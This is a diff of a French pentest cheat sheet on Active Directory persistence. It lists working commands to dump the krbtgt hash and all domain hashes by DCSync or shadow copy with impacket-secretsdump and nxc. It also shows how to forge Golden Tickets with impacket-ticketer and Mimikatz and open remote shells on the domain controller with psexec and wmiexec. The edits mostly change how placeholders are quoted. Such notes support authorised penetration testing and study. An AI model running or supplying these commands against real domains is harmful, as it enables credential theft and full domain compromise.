@@ -1,4 +1,4 @@
-# Persistence
+﻿# Persistence
 
 ## Golden Ticket
 
@@ -13,9 +13,9 @@ Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**
 1. Obtenir le hash krbtgt
 ```bash
 # Depuis Kali via DCSync
-impacket-secretsdump -just-dc-user krbtgt corp.com/<DA_user>:<password>@<IP_DC>
+impacket-secretsdump -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
 # ou
-nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
+nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 # → noter le hash NTLM de krbtgt
 ```
 
@@ -23,18 +23,18 @@ nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
 
 ```bash
 # Obtenir le Domain SID ET le RID du compte cible en une seule commande
-impacket-lookupsid corp.com/<user>:<password>@<IP_DC>
+impacket-lookupsid corp.com/'USER':'PASSWORD'@'IP_DC'
 # S-1-5-21-YYY-YYY-YYY-RID
 # Enlever le RID et on obtient le domain-sid
 
 # Forger le ticket (-user-id obligatoire sur Server 2022+)
-impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.com -user-id <RID> <username>
-# → génère <username>.ccache
+impacket-ticketer -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
+# → génère <USERNAME>.ccache
 
 # Charger et utiliser
-export KRB5CCNAME=<username>.ccache
-impacket-psexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
-impacket-wmiexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-psexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
+impacket-wmiexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
 ```
 
 **Windows (Mimikatz)**
@@ -44,7 +44,7 @@ impacket-wmiexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -ta
 kerberos::purge
 
 # Forger et injecter le Golden Ticket
-kerberos::golden /user:<user> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
+kerberos::golden /user:<USER> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
 
 # Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
 misc::cmd
@@ -69,14 +69,14 @@ Deux méthodes pour extraire tous les hashes du domaine :
 
 ```bash
 # VSS method -  crée la shadow copy à distance et parse NTDS.dit
-impacket-secretsdump -use-vss corp.com/<DA_user>:<password>@<IP_DC>
+impacket-secretsdump -use-vss corp.com/'DA_USER':'PASSWORD'@'IP_DC'
 
 # ou via nxc
-nxc smb <IP_DC> -u <DA_user> -p <password> --ntds vss
+nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds vss
 
 # Sans VSS -  DCSync direct (plus rapide, pas de shadow copy)
-impacket-secretsdump corp.com/<DA_user>:<password>@<IP_DC>
-nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
+impacket-secretsdump corp.com/'DA_USER':'PASSWORD'@'IP_DC'
+nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 ```
 
 **Windows**
